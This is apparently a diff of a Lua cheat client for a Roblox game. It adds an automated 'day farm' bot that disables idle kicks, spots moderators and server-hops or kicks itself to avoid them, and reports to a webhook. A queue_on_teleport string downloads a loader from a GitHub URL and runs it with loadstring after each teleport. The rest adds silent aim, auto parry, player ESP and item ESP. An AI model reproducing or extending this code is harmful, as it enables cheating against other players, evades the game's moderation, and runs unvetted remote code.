+                    if role ~= "Guest" then
+                        return true
+                    end
+                end
+
+                return false
+            end
+
+            local function no_kick()
+                if Toggles and Toggles.no_kick and Toggles.no_kick.Value then
+                    return true
+                end
+                return false
+            end
+
+            function cheat_client:day_farm(state)
+                for _, connection in next, getconnections(plr.Idled) do
+                    if state then 
+                        connection:Disable()
+                    else 
+                        connection:Enable()
+                    end
+                end
+                
+                if not shared.deathConnection then
+                    shared.deathConnection = nil
+                end
+                
+                if not shared.characterAddedConnection then
+                    shared.characterAddedConnection = nil
+                end
+                
+                if state then
+                    mem:SetItem('dayfarming', 'true')
+
+                    local ptr = Options.day_farm_range
+                    local noKickPtr = Toggles and Toggles.no_kick
+                    local daygoalKickPtr = Toggles and Toggles.day_goal_kick
+                    local dayGoalPtr = Options.DayGoal
+
+                    if ptr then
+                        mem:SetItem('dayfarming_range', tostring(ptr.Value))
+                    else
+                        mem:SetItem('dayfarming_range', "500")
+                    end
+
+                    if daygoalKickPtr then
+                        mem:SetItem('day_goal_kick', daygoalKickPtr.Value and "true" or "false")
+                    else
+                        mem:SetItem('day_goal_kick', "false")
+                    end
+
+                    if noKickPtr then
+                        mem:SetItem('no_kick', noKickPtr.Value and "true" or "false")
+                    else
+                        mem:SetItem('no_kick', "false")
+                    end
+
+                    if dayGoalPtr then
+                        mem:SetItem('daygoal', tostring(dayGoalPtr.Value))
+                    else
+                        mem:SetItem('daygoal', "999")
+                    end
+
+                    local httpService = Services.HttpService
+                    pcall(function()
+                        local shared_settings = {}
+                        if mem:HasItem("shared_settings") then
+                            local success, loaded = pcall(function()
+                                return httpService:JSONDecode(mem:GetItem("shared_settings"))
+                            end)
+                            if success and loaded then
+                                shared_settings = loaded
+                            end
+                        end
+                        shared_settings.webhook = cheat_client.config.webhook or ""
+                        shared_settings.show_in_artifact_stream = cheat_client.config.show_in_artifact_stream or false
+                        mem:SetItem("shared_settings", httpService:JSONEncode(shared_settings))
+                    end)
+
+
+                    local playerCount = #plrs:GetPlayers()
+                    local server_name, server_region = get_server_info()
+
+                    utility:plain_webhook(string.format(
+                        "Started farming days in `%s (%s)` with %d players",
+                        server_name ~= "" and server_name or "Unknown",
+                        server_region ~= "" and server_region or "Unknown",
+                        playerCount
+                    ))
+
+
+                    cpu.status.active = true
+                    
+                    if shared.focusConnection then
+                        shared.focusConnection:Disconnect()
+                    end
+                    
+                    shared.focusConnection = utility:Connection(uis.WindowFocused, function()
+                        if not cpu.status.active then return end
+                        cpu.status.focused = true
+                        if cpu.status.hd_mode then
+                            setfpscap(50)
+                        else
+                            setfpscap(20)
+                        end
+                        cpu.services.ugs.MasterVolume = cpu.services.ms
+                        settings().Rendering.QualityLevel = cpu.services.ql
+                        cpu.services.rs:Set3dRenderingEnabled(true)
+                    end)
+
+                    if shared.unfocusConnection then
+                        shared.unfocusConnection:Disconnect()
+                    end
+
+                    shared.unfocusConnection = utility:Connection(uis.WindowFocusReleased, function()
+                        if not cpu.status.active then return end
+                        cpu.status.focused = false
+                        setfpscap(15)
+                        settings().Rendering.QualityLevel = 1
+                        cpu.services.rs:Set3dRenderingEnabled(false)
+                    end)
+                    
+                    local function kickPlayer(message)
+                        if cs:HasTag(plr.Character, "Danger") then
+                            repeat task.wait(0.1) until not cs:HasTag(plr.Character, "Danger")
+                        end
+
+                        utility:plain_webhook(message)
+                        rps.Requests.ReturnToMenu:InvokeServer()
+                        plr:Kick(message)
+                        utility:Unload()
+                    end
+
+                    local teleport_debounce = false
+                    local function DayfarmServerhop(reason)
+                        if teleport_debounce then return end
+
+                        if plr.Character and cs:HasTag(plr.Character, "Danger") then
+                            repeat task.wait(0.1) until not cs:HasTag(plr.Character, "Danger")
+                        end
+
+                        utility:plain_webhook(reason or "Dayfarm serverhopping")
+
+                        if rps.Requests and FindFirstChild(rps.Requests, "ReturnToMenu") and plr.Character then
+                            pcall(function()
+                                rps.Requests.ReturnToMenu:InvokeServer()
+                            end)
+                            task.wait(0.5)
+                        end
+
+                        if not shared.on_teleport_setup then
+                            shared.on_teleport_setup = true
+                            shared.on_teleport_connection = plr.OnTeleport:Connect(function(State)
+                                if teleport_debounce then return end
+                                teleport_debounce = true
+
+                                local queue_func = queueteleport or queue_on_teleport
+                                if queue_func then
+                                    local success, err = pcall(function()
+                                        local loader_script = game
+										loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/loader.lua") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
+                                        queue_func(loader_script)
+                                    end)
+
+                                    if not success then
+                                        utility:plain_webhook(string.format("FAILED to queue script: %s", tostring(err)))
+                                    end
+                                else
+                                    utility:plain_webhook("WARNING: queueteleport not available - script will NOT auto-load!")
+                                end
+                            end)
+                        end
+
+                        task.wait(0.5)
+                        utility:Serverhop()
+                    end
+
+                    local function handle_dayfarm_moderator(moderator_player)
+                        if not moderator_player then return end
+
+                        local mod_name = moderator_player.Name
+                        local mem_key = "dayfarm_mod_encounter_" .. mod_name
+
+                        local encounter_count = 1
+                        if mem:HasItem(mem_key) then
+                            encounter_count = tonumber(mem:GetItem(mem_key)) or 1
+                            encounter_count = encounter_count + 1
+                        end
+
+                        mem:SetItem(mem_key, tostring(encounter_count))
+
+                        if encounter_count >= 2 then
+                            library:Notify(string.format("!! MODERATOR %s ENCOUNTERED %d TIMES - KICKING !!", mod_name, encounter_count))
+
+                            if utility then
+                                utility:plain_webhook(string.format("@everyone Encountered moderator %s again after serverhop, kicking", mod_name))
+                            end
+
+                            task.wait(0.5)
+                            plr:Kick(string.format("Moderator %s encountered %d times during day farm", mod_name, encounter_count))
+                        else
+                            library:Notify(string.format("!! MODERATOR %s DETECTED (encounter %d/2) - SERVERHOPPING !!", mod_name, encounter_count))
+                            DayfarmServerhop(string.format("Moderator %s detected (encounter %d/2)", mod_name, encounter_count))
+                        end
+                    end
+
+                    shared.dangerousItemConnection = utility:Connection(ws.Live.DescendantAdded, function(descendant)
+                        if not (Toggles and Toggles.day_farm and Toggles.day_farm.Value) then return end
+                        if no_kick() then return end
+
+                        if descendant:IsA("Tool") and (descendant.Name == "Perflora" or descendant.Name == "Pebble") then
+                            local character = descendant.Parent
+                            if character and character:IsA("Model") then
+                                local player = plrs:GetPlayerFromCharacter(character)
+                                if player and player ~= plr then
+                                    DayfarmServerhop(string.format("%s (%s) has dangerous item: %s", player.Name, player.UserId, descendant.Name))
+                                end
+                            end
+                        end
+                    end)
+
+                    if not no_kick() then
+                        for _, other_player in next, plrs:GetPlayers() do
+                            if other_player ~= plr and other_player.Character then
+                                for _, tool in next, other_player.Character:GetChildren() do
+                                    if tool:IsA("Tool") and (tool.Name == "Perflora" or tool.Name == "Pebble") then
+                                        DayfarmServerhop(string.format("%s (%s) already has dangerous item: %s", other_player.Name, other_player.UserId, tool.Name))
+                                        return
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    local time_elapsed = 0
+                    local server_hop_initiated = false
+
+                    cheat_client.feature_connections.day_farm = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function(delta_time)
+                        if not server_hop_initiated then
+                            time_elapsed += delta_time
+                            if time_elapsed >= 1 then
+                                time_elapsed = 0
+
+                                if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                    return
+                                end
+
+                                if no_kick() then
+                                    return
+                                end
+
+                                local range = (Options and Options.day_farm_range and Options.day_farm_range.Value) or 50
+                                local myPosition = plr.Character.HumanoidRootPart.Position
+
+                                for _, player in next, plrs:GetPlayers() do
+                                    if player == plr then continue end
+
+                                    if not player.Character or not FindFirstChild(player.Character, "HumanoidRootPart") then
+                                        continue
+                                    end
+
+                                    local theirPosition = player.Character.HumanoidRootPart.Position
+                                    local distance = (myPosition - theirPosition).Magnitude
+
+
+                                    if distance < range and distance > 0.1 then
+                                        if cs:HasTag(plr.Character, "Danger") then
+                                            repeat
+                                                task.wait(0.1)
+                                            until not cs:HasTag(plr.Character, "Danger")
+                                        end
+
+                                        server_hop_initiated = true
+                                        print(string.format("[Day Farm] TRIGGER: %s came too close (%.2f studs < %.2f range)", player.Name, distance, range))
+                                        DayfarmServerhop(string.format("%s (%s) came too close (%.2f studs)", player.Name, player.UserId, distance))
+                                        break
+                                    end
+                                end
+                            end
+                        end
+                    end))
+
+                    shared.day_farm_player_connections = shared.day_farm_player_connections or {}
+
+                    for _, player in ipairs(plrs:GetPlayers()) do
+                        if player == plr then continue end
+
+                        if is_moderator(player) and not no_kick() then
+                            handle_dayfarm_moderator(player)
+                            return
+                        end
+
+                        if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") and player.Character and FindFirstChild(player.Character, "HumanoidRootPart") then
+                            local range = (Options and Options.day_farm_range and Options.day_farm_range.Value) or 50
+                            local distance = (plr.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+                            if distance < range and distance > 0.1 and not no_kick() then
+                                DayfarmServerhop(string.format("%s (%s) was already too close when day farm started (%.2f studs)", player.Name, player.UserId, distance))
+                                return
+                            end
+                        end
+
+                        shared.day_farm_player_connections[player] = utility:Connection(player.CharacterAdded, function(character)
+                            if not (Toggles and Toggles.day_farm and Toggles.day_farm.Value) then return end
+                            if no_kick() then return end
+
+                            task.wait(1)
+
+                            if FindFirstChild(character, "HumanoidRootPart") and plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                local range = (Options and Options.day_farm_range and Options.day_farm_range.Value) or 50
+                                local distance = (plr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).Magnitude
+                                if distance < range and distance > 0.1 then
+                                    DayfarmServerhop(string.format("%s (%s) spawned too close (%.2f studs)", player.Name, player.UserId, distance))
+                                end
+                            end
+                        end, true)
+                    end
+
+                    shared.playerAddedConnection = utility:Connection(plrs.PlayerAdded, function(player)
+                        if not (Toggles and Toggles.day_farm and Toggles.day_farm.Value) then return end
+                        if no_kick() then return end
+
+                        if is_moderator(player) then
+                            handle_dayfarm_moderator(player)
+                            return
+                        end
+
+                        local characterAddedConnection
+                        characterAddedConnection = utility:Connection(player.CharacterAdded, function(character)
+                            task.wait(1)
+
+                            if FindFirstChild(character, "HumanoidRootPart") and plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                local distance = (plr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).Magnitude
+                                if distance < ((Options and Options.day_farm_range and Options.day_farm_range.Value) or 50) then
+                                    DayfarmServerhop(string.format("%s (%s) joined and spawned too close (%.2f studs)", player.Name, player.UserId, distance))
+                                end
+                            end
+                            characterAddedConnection:Disconnect()
+                        end, true)
+
+                        shared.day_farm_player_connections[player] = characterAddedConnection
+
+                        if player.Character then
+                            if FindFirstChild(player.Character, "HumanoidRootPart") and plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                local distance = (plr.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+                                if distance < ((Options and Options.day_farm_range and Options.day_farm_range.Value) or 50) then
+                                    DayfarmServerhop(string.format("%s (%s) was already too close (%.2f studs)", player.Name, player.UserId, distance))
+                                end
+                            end
+                        end
+                    end)
+
+                    if plr.Character and FindFirstChild(plr.Character, "Humanoid") then
+                        if shared.deathConnection then
+                            shared.deathConnection:Disconnect()
+                        end
+
+                        shared.deathConnection = utility:Connection(plr.Character.Humanoid.Died, function()
+                            if cs:HasTag(plr.Character, "Danger") then
+                                repeat
+                                    task.wait(0.1)
+                                until not cs:HasTag(plr.Character, "Danger")
+                            end
+
+                            utility:plain_webhook("player died during day farm??")
+                            rps.Requests.ReturnToMenu:InvokeServer()
+                            plr:Kick("player died during day farm")
+                            utility:Unload(true)
+                        end)
+                    end
+                    
+                    if shared.characterAddedConnection then
+                        shared.characterAddedConnection:Disconnect()
+                    end
+                    
+                    shared.characterAddedConnection = utility:Connection(plr.CharacterAdded, function(character)
+                        if shared.deathConnection then
+                            shared.deathConnection:Disconnect()
+                        end
+                        
+                        task.wait(1)
+                        
+                        if FindFirstChild(character, "Humanoid") then
+                            shared.deathConnection = utility:Connection(character.Humanoid.Died, function()
+                                if cs:HasTag(character, "Danger") then
+                                    repeat
+                                        task.wait(0.1)
+                                    until not cs:HasTag(character, "Danger")
+                                end
+
+                                utility:plain_webhook("player died during day farm??")
+                                rps.Requests.ReturnToMenu:InvokeServer()
+                                plr:Kick("player died during day farm")
+                                utility:Unload(true)
+                            end)
+                        end
+                    end)
+                else
+                    cpu.status.active = false
+                    setfpscap(240)
+                    settings().Rendering.QualityLevel = cpu.services.ql
+                    cpu.services.rs:Set3dRenderingEnabled(true)
+
+                    if shared.cpuOptimizationConnection then
+                        shared.cpuOptimizationConnection:Disconnect()
+                        shared.cpuOptimizationConnection = nil
+                    end
+                    
+                    if shared.focusConnection then
+                        shared.focusConnection:Disconnect()
+                        shared.focusConnection = nil
+                    end
+                    
+                    if shared.unfocusConnection then
+                        shared.unfocusConnection:Disconnect()
+                        shared.unfocusConnection = nil
+                    end
+                    
+                    if shared.deathConnection then
+                        shared.deathConnection:Disconnect()
+                        shared.deathConnection = nil
+                    end
+                    
+                    if shared.characterAddedConnection then
+                        shared.characterAddedConnection:Disconnect()
+                        shared.characterAddedConnection = nil
+                    end
+
+                    if shared.dangerousItemConnection then
+                        shared.dangerousItemConnection:Disconnect()
+                        shared.dangerousItemConnection = nil
+                    end
+
+                    if cheat_client.feature_connections.day_farm then
+                        cheat_client.feature_connections.day_farm:Disconnect()
+                        cheat_client.feature_connections.day_farm = nil
+                    end
+
+                    if shared.playerAddedConnection then
+                        shared.playerAddedConnection:Disconnect()
+                        shared.playerAddedConnection = nil
+                    end
+
+                    if shared.day_farm_player_connections then
+                        for player, conn in pairs(shared.day_farm_player_connections) do
+                            if conn and conn.Disconnect then
+                                conn:Disconnect()
+                            end
+                        end
+                        shared.day_farm_player_connections = {}
+                    end
+
+                    mem:RemoveItem("dayfarming")
+                    mem:RemoveItem("dayfarming_range")
+                    mem:RemoveItem("day_goal_kick")
+                    mem:RemoveItem("no_kick")
+                    mem:RemoveItem("daygoal")
+                end
+            end
+
+
+            task.spawn(function()
+                if mem:HasItem("dayfarming") and mem:GetItem("dayfarming") == "true" then
+                    task.wait(2)
+
+                    for _, player in next, plrs:GetPlayers() do
+                        if player ~= plr and is_moderator(player) then
+                            local mod_name = player.Name
+                            local mem_key = "dayfarm_mod_encounter_" .. mod_name
+
+                            local encounter_count = 1
+                            if mem:HasItem(mem_key) then
+                                encounter_count = tonumber(mem:GetItem(mem_key)) or 1
+                                encounter_count = encounter_count + 1
+                            end
+
+                            mem:SetItem(mem_key, tostring(encounter_count))
+
+                            if encounter_count >= 2 then
+                                library:Notify(string.format("!! MODERATOR %s ENCOUNTERED %d TIMES - KICKING !!", mod_name, encounter_count))
+                                utility:plain_webhook(string.format("@everyone Encountered moderator %s again after serverhop during auto-restart, kicking", mod_name))
+                                task.wait(0.5)
+                                plr:Kick(string.format("Moderator %s encountered %d times during day farm auto-restart", mod_name, encounter_count))
+                            else
+                                library:Notify(string.format("!! MODERATOR %s DETECTED (encounter %d/2) - SERVERHOPPING !!", mod_name, encounter_count))
+                                utility:plain_webhook(string.format("Moderator %s detected on dayfarm auto-restart (encounter %d/2) - serverhopping", mod_name, encounter_count))
+                                utility:Serverhop()
+                            end
+                            return
+                        end
+                    end
+
+                    local success = pcall(function()
+                        plr.PlayerGui:WaitForChild("StartMenu", 30)
+                    end)
+
+                    if success and FindFirstChild(plr.PlayerGui, "StartMenu") then
+                        task.wait(1)
+
+                        pcall(function()
+                            if FindFirstChild(plr.PlayerGui.StartMenu, "Choices") and
+                               FindFirstChild(plr.PlayerGui.StartMenu.Choices, "Play") then
+                                firesignal(plr.PlayerGui.StartMenu.Choices.Play.MouseButton1Click)
+                            end
+                        end)
+
+                        repeat task.wait(0.25) until plr.Character
+                        repeat task.wait(0.25) until FindFirstChild(plr.Character, "HumanoidRootPart")
+                        task.wait(1)
+
+                        if mem:HasItem('dayfarming_range') then
+                            local range = tonumber(mem:GetItem('dayfarming_range'))
+                            if range and library.Options and library.Options.day_farm_range then
+                                library.Options.day_farm_range:SetValue(range)
+                            end
+                        end
+
+                        if mem:HasItem('day_goal_kick') then
+                            local kick = mem:GetItem('day_goal_kick') == "true"
+                            if library.Toggles and library.Toggles.day_goal_kick then
+                                library.Toggles.day_goal_kick:SetValue(kick)
+                            end
+                        end
+
+                        if mem:HasItem('no_kick') then
+                            local no_kick_val = mem:GetItem('no_kick') == "true"
+                            if library.Toggles and library.Toggles.no_kick then
+                                library.Toggles.no_kick:SetValue(no_kick_val)
+                            end
+                        end
+
+                        if mem:HasItem('daygoal') then
+                            local goal = tonumber(mem:GetItem('daygoal'))
+                            if goal and library.Options and library.Options.DayGoal then
+                                library.Options.DayGoal:SetValue(tostring(goal))
+                            end
+                        end
+
+                        if mem:HasItem("shared_settings") then
+                            local httpService = Services.HttpService
+                            local success, shared_settings = pcall(function()
+                                return httpService:JSONDecode(mem:GetItem("shared_settings"))
+                            end)
+                            if success and shared_settings then
+                                if shared_settings.webhook then
+                                    cheat_client.config.webhook = shared_settings.webhook
+                                    if library.Options and library.Options.webhook_url then
+                                        library.Options.webhook_url:SetValue(shared_settings.webhook)
+                                    end
+                                end
+                                if shared_settings.webhook_username then
+                                    cheat_client.config.webhook_username = shared_settings.webhook_username
+                                    if library.Options and library.Options.webhook_username then
+                                        library.Options.webhook_username:SetValue(shared_settings.webhook_username)
+                                    end
+                                end
+                                if shared_settings.show_in_artifact_stream ~= nil then
+                                    cheat_client.config.show_in_artifact_stream = shared_settings.show_in_artifact_stream
+                                    if library.Toggles and library.Toggles.show_in_artifact_stream then
+                                        library.Toggles.show_in_artifact_stream:SetValue(shared_settings.show_in_artifact_stream)
+                                    end
+                                end
+                            end
+                        end
+
+                        library:Notify("Auto-restarting day farm...")
+                        task.wait(1)
+
+                        if library.Toggles and library.Toggles.day_farm then
+                            library.Toggles.day_farm:SetValue(true)
+                        else
+                            cheat_client:day_farm(true)
+                        end
+                    end
+                end
+            end)
+        end
     end
     
-    -- UI
     do
-        -- Proper Library Initialization
         local Options = library.Options
         local Toggles = library.Toggles
 
@@ -4801,7 +7352,6 @@ if game.PlaceId == 100010170789226 then
             DisableSearch = false
         })
 
-        -- Tab Structure
         local Tabs = {
             Combat = window:AddTab("Combat", "sword"),
             Visuals = window:AddTab("Visuals", "eye"),
@@ -4810,13 +7360,13 @@ if game.PlaceId == 100010170789226 then
             Movement = window:AddTab("Movement", "wind"),
             Automation = window:AddTab("Automation", "cog"),
             Misc = window:AddTab("Misc", "settings"),
+            Botting = window:AddTab("Botting", "bot"),
             Macros = window:AddTab("Macros", "play"),
             Interface = window:AddTab("Interface", "monitor"),
             Config = window:AddTab("Config", "save")
         }
 
-        do -- Combat
-            -- Group 1: Combat Utilities
+        do
             local group_combat_utils = Tabs.Combat:AddLeftGroupbox("Combat Utilities")
 
             group_combat_utils:AddToggle("NoStun", {
@@ -4855,6 +7405,17 @@ if game.PlaceId == 100010170789226 then
                 end
             })
 
+            group_combat_utils:AddToggle("BetterUnequip", {
+                Text = "Better Unequip",
+                Default = cheat_client.config.better_unequip or false,
+                Tooltip = "When your Dagger/Sword is removed, instantly equips a skill to cancel the animation then unequips",
+                Callback = function(value)
+                    cheat_client.config.better_unequip = value
+                end
+            })
+
+            group_combat_utils:AddDivider()
+
             group_combat_utils:AddToggle("AutoMisogi", {
                 Text = "Auto Misogi",
                 Default = cheat_client.config.auto_misogi
@@ -4867,21 +7428,20 @@ if game.PlaceId == 100010170789226 then
 
             group_combat_utils:AddDivider()
 
-            group_combat_utils:AddToggle("HoldBlock", {
-                Text = "Hold Block (F)",
-                Default = cheat_client.config.hold_block
-            })
+                group_combat_utils:AddToggle("HoldBlock", {
+                    Text = "Hold Block (F)",
+                    Default = cheat_client.config.hold_block
+                })
 
-            group_combat_utils:AddSlider("HoldBlockDelay", {
-                Text = "Block Delay (ms)",
-                Default = cheat_client.config.hold_block_delay,
-                Min = 0,
-                Max = 1000,
-                Rounding = 0,
-                Compact = true
-            })
+                group_combat_utils:AddSlider("HoldBlockDelay", {
+                    Text = "Block Delay (ms)",
+                    Default = cheat_client.config.hold_block_delay,
+                    Min = 0,
+                    Max = 1000,
+                    Rounding = 0,
+                    Compact = true
+                })
 
-            -- Group 2: Auto Parry
             local group_auto_parry = Tabs.Combat:AddRightGroupbox("Auto Parry")
 
             group_auto_parry:AddToggle("AutoPerfectBlock", {
@@ -4897,7 +7457,6 @@ if game.PlaceId == 100010170789226 then
                 Tooltip = "Select which abilities to auto parry"
             })
 
-            -- Group 3: Parry Settings
             local group_parry_settings = Tabs.Combat:AddLeftGroupbox("Parry Settings")
 
             group_parry_settings:AddToggle("ParryPingAdjust", {
@@ -4941,7 +7500,6 @@ if game.PlaceId == 100010170789226 then
                 Default = cheat_client.config.parry_semi_blatant_block
             })
 
-            -- Group 4: Silent Aim
             local group_silent_aim = Tabs.Combat:AddRightGroupbox("Silent Aim")
 
             group_silent_aim:AddToggle("SilentAim", {
@@ -4966,6 +7524,11 @@ if game.PlaceId == 100010170789226 then
             group_silent_aim:AddToggle("HideFovCircle", {
                 Text = "Hide FOV Circle",
                 Default = cheat_client.config.hide_fov_circle
+            })
+
+            group_silent_aim:AddToggle("SilentAimVisibleCheck", {
+                Text = "Visible Check",
+                Default = cheat_client.config.visible_check
             })
 
             Toggles.NoStun:OnChanged(function()
@@ -5018,16 +7581,11 @@ if game.PlaceId == 100010170789226 then
                 end
             end)
 
-            Options.HoldBlockDelay:OnChanged(function()
-                cheat_client.config.hold_block_delay = Options.HoldBlockDelay.Value
-            end)
-
             Toggles.AutoPerfectBlock:OnChanged(function()
                 local value = Toggles.AutoPerfectBlock.Value
                 cheat_client.config.auto_perfect_block = value
             end)
 
-            -- ParryAbilities values are checked directly via Options.ParryAbilities.Value
             Toggles.ParryPingAdjust:OnChanged(function()
                 local value = Toggles.ParryPingAdjust.Value
                 cheat_client.config.parry_ping_adjust = value
@@ -5093,13 +7651,18 @@ if game.PlaceId == 100010170789226 then
                 cheat_client.config.hide_fov_circle = value
             end)
 
+            Toggles.SilentAimVisibleCheck:OnChanged(function()
+                local value = Toggles.SilentAimVisibleCheck.Value
+                cheat_client.config.visible_check = value
+            end)
+
         end
     
-        do -- Visuals
+        do
             local group_player = Tabs.Visuals:AddLeftGroupbox("Player ESP")
             local group_chams = Tabs.Visuals:AddRightGroupbox("Chams")
     
-            do -- Player
+            do
                 group_player:AddToggle("PlayerEsp", {
                     Text = "Player ESP",
                     Default = cheat_client.config.player_esp
@@ -5208,14 +7771,13 @@ if game.PlaceId == 100010170789226 then
 
                 group_player:AddDivider()
 
-                -- Chams
                 local function color_index(color)
                     for i, v in ipairs(shared.colors) do
                         if v == color then
                             return i
                         end
                     end
-                    return 1 -- fallback index
+                    return 1
                 end
 
                 group_chams:AddToggle("PlayerChams", {
@@ -5256,7 +7818,6 @@ if game.PlaceId == 100010170789226 then
                     Default = cheat_client.config.player_chams_occluded
                 })
 
-                -- Hook all chams toggles to the rendering system
                 Toggles.PlayerChams:OnChanged(function()
                     cheat_client.config.player_chams = Toggles.PlayerChams.Value
                     cheat_client.esp_rendering.update_chams()
@@ -5278,15 +7839,10 @@ if game.PlaceId == 100010170789226 then
                     cheat_client.esp_rendering.update_chams()
                 end)
 
-                -- Color picker can be added later if needed
-                -- group_chams:AddColorPicker("player_chams_color", {
-                --     Default = cheat_client.config.player_chams_color,
-                --     Title = "Chams Color"
-                -- })
 
                 group_player:AddDivider()
 
-                do -- player healthview
+                do
                     local hv_connection;
                     group_player:AddToggle("PlayerHealthview", {
                         Text = "Player Healthview",
@@ -5347,7 +7903,7 @@ if game.PlaceId == 100010170789226 then
                                 hv_connection = nil
                             end
                         end
-                    end) -- <-- make sure this closing ')' exists
+                    end)
 
                     group_player:AddToggle("LegitIntent", {
                         Text = "Seer Intent",
@@ -5405,11 +7961,116 @@ if game.PlaceId == 100010170789226 then
             })
 
             local group_misc_esp = Tabs.Visuals:AddLeftGroupbox("World ESP")
-            do -- NPC Esp
+            local group_ingredient_esp = Tabs.Visuals:AddRightGroupbox("Ingredient ESP")
+            local group_ore_esp = Tabs.Visuals:AddLeftGroupbox("Ore ESP")
+
+            do
+                group_misc_esp:AddToggle("TrinketEsp", {
+                    Text = "Trinket ESP",
+                    Default = cheat_client.config.trinket_esp
+                })
+
+                Toggles.TrinketEsp:OnChanged(function()
+                    if Toggles.TrinketEsp.Value then
+                        cheat_client.trinket_esp_objects = cheat_client.trinket_esp_objects or {}
+                        for _, object in pairs(ws:GetChildren()) do
+                            if object.Name == "Part" and FindFirstChild(object, "ID") and not cheat_client.trinket_esp_objects[object] then
+                                local trinket_name, trinket_color, trinket_zindex = cheat_client:identify_trinket(object)
+                                cheat_client:add_trinket_esp(object, trinket_name, trinket_color, trinket_zindex)
+                            end
+                        end
+
+                        cheat_client.esp_rendering.start_trinket_esp()
+                    else
+                        cheat_client.esp_rendering.stop_trinket_esp()
+
+                        for trinket, esp in pairs(cheat_client.trinket_esp_objects or {}) do
+                            if esp and esp.destruct then
+                                esp:destruct()
+                            end
+                        end
+                        cheat_client.trinket_esp_objects = {}
+                    end
+                end)
+
+                group_misc_esp:AddToggle("TrinketShowArea", {
+                    Text = "Show Area",
+                    Default = cheat_client.config.trinket_show_area
+                })
+
+                group_misc_esp:AddDropdown("TrinketTypes", {
+                    Text = "Show Types",
+                    Values = {"Common", "Rare", "Mythic", "Artifact", "Event"},
+                    Default = {1, 2, 3, 4, 5},
+                    Multi = true,
+                    Callback = function(value)
+                        cheat_client.config.trinket_types = value
+                    end
+                })
+
+                group_misc_esp:AddDropdown("TrinketIgnoreRangeTypes", {
+                    Text = "Unlimited Range For",
+                    Values = {"Common", "Rare", "Mythic", "Artifact", "Event"},
+                    Default = {3, 4, 5},
+                    Multi = true,
+                    Callback = function(value)
+                        cheat_client.config.trinket_ignore_range_types = value
+
+                        if Options.TrinketTypes then
+                            local show_types = Options.TrinketTypes.Value or {}
+                            for trinket_type, enabled in pairs(value) do
+                                if enabled then
+                                    show_types[trinket_type] = true
+                                end
+                            end
+                            Options.TrinketTypes:SetValue(show_types)
+                        end
+                    end
+                })
+
+                group_misc_esp:AddSlider("TrinketRange", {
+                    Text = "Range",
+                    Default = cheat_client.config.trinket_range,
+                    Min = 0,
+                    Max = 2000,
+                    Rounding = 1
+                })
+            end
+
+            group_misc_esp:AddDivider()
+
+            do
                 group_chams:AddToggle("ShriekerChams", {
                     Text = "Shrieker Chams",
                     Default = cheat_client.config.shrieker_chams
                 })
+
+                group_misc_esp:AddToggle("FallionEsp", {
+                    Text = "Fallion ESP",
+                    Default = cheat_client.config.fallion_esp
+                })
+
+                Toggles.FallionEsp:OnChanged(function()
+                    local toggled = Toggles.FallionEsp.Value
+                        cheat_client.config.fallion_esp = toggled
+
+                        if not toggled then
+                            cheat_client.esp_rendering.stop_fallion_esp()
+                            for fallion, esp in pairs(cheat_client.fallion_esp_objects or {}) do
+                                esp:destruct()
+                            end
+                            cheat_client.fallion_esp_objects = {}
+                        else
+                            if game.PlaceId == 5208655184 or game.PlaceId == 109732117428502 then
+                                for _, fallion in next, ws.NPCs:GetChildren() do
+                                    if fallion.Name == "Fallion" then
+                                        cheat_client:add_fallion_esp(fallion, fallion.Name)
+                                    end
+                                end
+                            end
+                            cheat_client.esp_rendering.start_fallion_esp()
+                        end
+                    end)
 
                 group_misc_esp:AddToggle("NpcEsp", {
                     Text = "NPC ESP",
@@ -5440,13 +8101,158 @@ if game.PlaceId == 100010170789226 then
                     end
                 )
             end
+
+            do
+                group_ingredient_esp:AddToggle("IngredientEsp", {
+                    Text = "Ingredient ESP",
+                    Default = cheat_client.config.ingredient_esp
+                }):AddKeyPicker("IngredientEspKeybind", {
+                    Default = cheat_client.config.ingredient_esp_keybind,
+                    Text = "Ingredient ESP Toggle",
+                    Mode = "Toggle",
+                    SyncToggleState = true,
+                })
+
+                Toggles.IngredientEsp:OnChanged(function()
+                    if Toggles.IngredientEsp.Value then
+                        cheat_client.ingredient_esp_objects = cheat_client.ingredient_esp_objects or {}
+                        if ingredient_folder then
+                            for _, object in pairs(ingredient_folder:GetChildren()) do
+                                if not cheat_client.ingredient_esp_objects[object] then
+                                    local ingredient_name = cheat_client:identify_ingredient(object)
+                                    cheat_client:add_ingredient_esp(object, ingredient_name)
+                                end
+                            end
+                        end
+
+                        cheat_client.esp_rendering.start_ingredient_esp()
+                    else
+                        cheat_client.esp_rendering.stop_ingredient_esp()
+
+                        for ingredient, esp in pairs(cheat_client.ingredient_esp_objects or {}) do
+                            if esp and esp.destruct then
+                                esp:destruct()
+                            end
+                        end
+                        cheat_client.ingredient_esp_objects = {}
+                    end
+                end)
+
+                Options.IngredientEspKeybind:OnChanged(function()
+                    cheat_client.config.ingredient_esp_keybind = Options.IngredientEspKeybind.Value
+                end)
+
+                group_ingredient_esp:AddSlider("IngredientRange", {
+                    Text = "Range",
+                    Default = cheat_client.config.ingredient_range,
+                    Min = 0,
+                    Max = 2000,
+                    Rounding = 1
+                })
+            end
+
+            do
+                if game.PlaceId ~= 14341521240 then
+                    group_ore_esp:AddToggle("ore_esp", {
+                    Text = "Ore ESP",
+                    Default = cheat_client.config.ore_esp,
+                    Callback = function(value)
